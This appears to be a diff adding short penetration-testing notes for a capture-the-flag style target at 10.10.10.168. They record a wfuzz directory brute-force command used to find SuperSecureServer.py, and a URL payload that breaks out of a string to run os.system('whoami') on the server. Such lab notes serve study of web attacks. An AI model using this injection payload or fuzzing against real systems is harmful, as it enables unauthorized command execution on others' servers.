@@ -1,0 +1,9 @@
+Server doesnt responde 302/200 to directories, need to find the full path
+
+We know one file: SuperSecureServer.py
+
+Need to fuzz the directories
+wfuzz -p 127.0.0.1:8080:HTTP -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt --hc=404 -R 3 -L http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
+
+Payload:
+http://localhost:8081/junk';{os.system('whoami')};#
